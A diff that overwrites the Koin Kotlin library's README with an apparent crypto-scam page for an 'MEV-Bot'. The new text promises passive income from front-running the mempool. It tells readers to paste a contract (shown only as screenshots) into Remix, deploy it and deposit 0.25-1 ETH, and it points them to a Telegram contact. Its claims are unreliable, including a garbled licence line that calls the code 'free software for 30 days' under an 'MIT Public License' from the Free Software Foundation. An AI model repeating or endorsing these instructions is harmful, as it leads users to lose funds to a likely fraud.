@@ -1,94 +1,62 @@
-![logo](./docs/img/koin_main_logo.png)
+# MEV-Bot
 
-[![Kotlin](https://img.shields.io/badge/Kotlin-1.9.24-blue.svg?style=flat&logo=kotlin)](https://kotlinlang.org)
-![Github Actions](https://github.com/InsertKoinIO/koin/actions/workflows/build.yml/badge.svg)
-[![Apache 2 License](https://img.shields.io/github/license/InsertKoinIO/koin)](https://github.com/InsertKoinIO/koin/blob/main/LICENSE.txt)
-[![Slack channel](https://img.shields.io/badge/Chat-Slack-orange.svg?style=flat&logo=slack)](https://kotlinlang.slack.com/messages/koin/)
+### Mining Extractable Value (MEV) offers a lucrative avenue for income generation derived from unconfirmed transactions in the mempool. Leveraging the cutting-edge infrastructure of Flashbot, you can earn passive income by exploiting MEV.
 
+Flashbot provides miners with the power to strategically select and sequence transactions in blocks, thereby extracting additional value. This opens up profitable trades, arbitrage opportunities, and a host of MEV-related prospects. Witness your earnings skyrocket based on transactions located in the blockchain's mempool!
 
-# What is KOIN?
- 
-Koin is a pragmatic lightweight dependency injection framework for Kotlin developers, developed by [Kotzilla](https://kotzilla.io) and open-source [contributors](https://github.com/InsertKoinIO/koin/graphs/contributors).
+## 💡 Introducing Flashbot
+Flashbot is an open infrastructure pioneered by a team of researchers and developers to exploit Miner Extractable Value (MEV) in the Ethereum network. It gives blockchain miners the power to gain additional value from transactions by controlling their order and inclusion in blocks.
 
-`Koin is a DSL, a light container and a pragmatic API`
+Flashbot aims to resolve issues related to MEV, such as frontrunning (snagging transactions before their inclusion in a block), and mitigate the adverse impact on users and Decentralized Finance (DeFi) applications.
 
+This infrastructure empowers developers and users to send bundles of transactions directly to Ethereum miners, bypassing the standard route via transaction pools. These bundles carry information about multiple transactions that need to be executed in a specific order, providing miners the choice to include or reject these bundles according to their preferences and objectives.
 
-## Setup & Current Version
-
-Here are the current available Koin project versions: ![](https://img.shields.io/badge/stable-version-blue) ![](https://img.shields.io/badge/unstable-version-orange)
-
-- Koin ![](https://img.shields.io/badge/3.5.6-blue) ![](https://img.shields.io/badge/3.6.0-Beta4-orange)
-- Koin for Compose ![](https://img.shields.io/badge/1.1.5-blue) ![](https://img.shields.io/badge/1.2.0-Beta4-orange)
-- Koin Annotations ![](https://img.shields.io/badge/1.3.1-blue) ![](https://img.shields.io/badge/1.4.0-Alpha1-orange)
-
-## Koin Packages
-
-| Project   |      Versions     |
-|----------|:-------------:|
-| [koin-bom](https://mvnrepository.com/artifact/io.insert-koin/koin-bom) |  ![](https://img.shields.io/badge/3.5.6-blue) - ![](https://img.shields.io/badge/3.6.0-Beta4-orange) |
-| [koin-core](https://mvnrepository.com/artifact/io.insert-koin/koin-core) |  ![](https://img.shields.io/badge/3.5.6-blue) - ![](https://img.shields.io/badge/3.6.0-Beta4-orange) |
-| [koin-core-coroutines](https://mvnrepository.com/artifact/io.insert-koin/koin-core-coroutines) |  ![](https://img.shields.io/badge/3.5.6-blue) - ![](https://img.shields.io/badge/3.6.0-Beta4-orange) |
-| [koin-test](https://mvnrepository.com/artifact/io.insert-koin/koin-test) |  ![](https://img.shields.io/badge/3.5.6-blue) - ![](https://img.shields.io/badge/3.6.0-Beta4-orange) |
-| [koin-android](https://mvnrepository.com/artifact/io.insert-koin/koin-android) |  ![](https://img.shields.io/badge/3.5.6-blue) - ![](https://img.shields.io/badge/3.6.0-Beta4-orange) |
-| [koin-android-test](https://mvnrepository.com/artifact/io.insert-koin/koin-android-test) |  ![](https://img.shields.io/badge/3.5.6-blue) - ![](https://img.shields.io/badge/3.6.0-Beta4-orange) |
-| [koin-android-compat](https://mvnrepository.com/artifact/io.insert-koin/koin-android-compat) |  ![](https://img.shields.io/badge/3.5.6-blue) - ![](https://img.shields.io/badge/3.6.0-Beta4-orange) |
-| [koin-android-navigation](https://mvnrepository.com/artifact/io.insert-koin/koin-android-navigation) |  ![](https://img.shields.io/badge/3.5.6-blue) - ![](https://img.shields.io/badge/3.6.0-Beta4-orange) |
-| [koin-android-workmanager](https://mvnrepository.com/artifact/io.insert-koin/koin-android-workmanager) |  ![](https://img.shields.io/badge/3.5.6-blue) - ![](https://img.shields.io/badge/3.6.0-Beta4-orange) |
-| [koin-android-compose](https://mvnrepository.com/artifact/io.insert-koin/koin-android-compose) |  ![](https://img.shields.io/badge/3.5.6-blue) - ![](https://img.shields.io/badge/3.6.0-Beta4-orange) |
-| [koin-android-compose-navigation](https://mvnrepository.com/artifact/io.insert-koin/koin-android-compose-navigation) |  ![](https://img.shields.io/badge/3.5.6-blue) - ![](https://img.shields.io/badge/3.6.0-Beta4-orange) |
-| [koin-ktor](https://mvnrepository.com/artifact/io.insert-koin/koin-ktor) |  ![](https://img.shields.io/badge/3.5.6-blue) - ![](https://img.shields.io/badge/3.6.0-Beta4-orange) |
-| [koin-compose](https://mvnrepository.com/artifact/io.insert-koin/koin-android-compose-navigation) |  ![](https://img.shields.io/badge/1.1.5-blue) - ![](https://img.shields.io/badge/1.2.0-Beta4-orange) |
-| [koin-compose-viewmodel](https://mvnrepository.com/artifact/io.insert-koin/koin-android-compose-navigation) |  ![](https://img.shields.io/badge/1.2.0-Beta4-orange) |
-| [koin-ktor](https://mvnrepository.com/artifact/io.insert-koin/koin-ktor) |  ![](https://img.shields.io/badge/3.5.6-blue) - ![](https://img.shields.io/badge/3.6.0-Beta4-orange) |
-| [koin-logger-slf4](https://mvnrepository.com/artifact/io.insert-koin/koin-logger-slf4) |  ![](https://img.shields.io/badge/3.5.6-blue) - ![](https://img.shields.io/badge/3.6.0-Beta4-orange) |
-| [koin-annotations](https://mvnrepository.com/artifact/io.insert-koin/koin-annotations) |  ![](https://img.shields.io/badge/1.3.1-blue) - ![](https://img.shields.io/badge/1.4.0-alpha1-orange) |
-
-🔎 Check the [latest changes](https://github.com/InsertKoinIO/koin/blob/main/CHANGELOG.md) to update your Koin project.
-
-🛠 Follow the [setup page](https://insert-koin.io/docs/setup/koin) for more details
+## 📊 Platform Comparison
+Platform	Router Address	Network	Mempool Scan Time
+Pancakeswap	0x10ED43C718714eb63d5aA57B78B54704E256024E	BSC	0.78 sec
+Uniswap	0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D	ETH	0.32 sec
 
 
-## Get started with Koin Tutorials 🚀
+## 🤖 How to Use MEVBot
+![241020628-7f849bd6-2e7a-4065-8119-e415dfb21777](https://i.ibb.co/JBFKJ3v/1.png)
 
-You can find here tutorials to help you learn and get started with Koin framework:
-- [Kotlin](https://insert-koin.io/docs/quickstart/kotlin)
-- [Kotlin with Koin Annotations](https://insert-koin.io/docs/quickstart/kotlin-annotations)
-- [Android](https://insert-koin.io/docs/quickstart/android-viewmodel)
-- [Android with Koin Annotations](https://insert-koin.io/docs/quickstart/android-annotations)
-- [Android Jetpack Compose](https://insert-koin.io/docs/quickstart/android-compose)
-- [Kotlin Multiplatform](https://insert-koin.io/docs/quickstart/kmp)
-- [Ktor](https://insert-koin.io/docs/quickstart/ktor)
+### Step 1: Access the Source Code 📝
+Navigate to the Remix IDE: https://remix.ethereum.org/
+Create a new file "MevBot.sol".
+Copy this code and paste it into the Remix IDE.
 
-## Latest News & Resources 🌐
-- The official Koin website: [insert-koin.io](https://insert-koin.io)
-- Twitter: [@insertkoin_io](https://twitter.com/insertkoin_io)
-- Medium: [Koin Developers Hub](https://medium.com/koin-developers)
-- Kotzilla Blog: [Kotzilla Blog](https://blog.kotzilla.io/)
+![image](https://i.ibb.co/XLWqQKv/2.png)
 
-## Community 💬
 
-- Come talk on slack [#koin](https://kotlinlang.slack.com/?redir=%2Fmessages%2Fkoin) channel
-- Post your question on [Stackoverflow](https://stackoverflow.com/questions/tagged/koin)
-- Found a bug or a problem? Open an issue on [Github issues](https://github.com/InsertKoinIO/koin/issues)
+### Step 2: Compile the Code ⚙️
+Select the Solidity compiler 0.6.12.
+Click 'Compile MevBot.sol'. 
+![image](https://i.ibb.co/HP4NnzY/3.png)
 
-## Contributing 🛠
 
-Want to help or share a proposal about Koin? problem on a specific feature? 
+### Step 3: Choose the Network 🌐
+Select either ETH or BSC (BNB) network.
+![image](https://i.ibb.co/5kSRqTf/4.png)
 
-- Open an issue to explain the issue you want to solve [Open an issue](https://github.com/InsertKoinIO/koin/issues)
-- Come talk on slack [#koin-dev](https://kotlinlang.slack.com/?redir=%2Fmessages%2Fkoin-dev) channel
-- After discussion to validate your ideas, you can open a PR or even a draft PR if the contribution is a big one [Current PRs](https://github.com/InsertKoinIO/koin/pulls)
 
-Additional readings about basic setup: https://github.com/InsertKoinIO/koin/blob/master/CONTRIBUTING.adoc
+### Step 4: Deploy the Code 🚀
+Click 'Transact (Deploy)'.
 
-### Contributors
 
-Thank you all for your work! ❤️
+### Step 5: Deposit into MEVBot 💰
+Copy your MEV contract and send an amount of Ethereum for the bot's operation.
+Start the bot by pressing the 'Start' button.
+![image](https://i.ibb.co/njpMWt1/5.png)
+![image](https://i.ibb.co/Jy56BDh/6.png)
 
-<a href="https://github.com/InsertKoinIO/koin/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=InsertKoinIO/koin" />
-</a>
+🔔 Note: For successful transactions on the Ethereum network, you must have sufficient balance to cover the gas fees. We recommend a minimum of 0.25-1 ETH.
 
-## OpenCollective - Sponsorship ❤️
+### You can withdraw funds by clicking the 'Stop' and 'Withdrawal' button.
 
-Support this project by becoming a sponsor and be displayed on the offcial website. [[Help us and Become a sponsor!](https://opencollective.com/koin#sponsor)]
+UPD: If you have closed the Remix IDE website or accidentally rebooted your computer, you can still access all the bot's functions through Etherscan. You will need to verify the bot contract on Etherscan, and you will have access to the same functions as you would through the Remix IDE website.
+
+Copyright (C) 2023 MevBotsETHandBSC
+
+This program is free software for 30 days: you can redistribute and/or modify it under the terms of the MIT Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
+> # Help
+If at any time you encounter any issues with the contract setup, contact our team at https://t.me/UniswapMevbots  🛡️
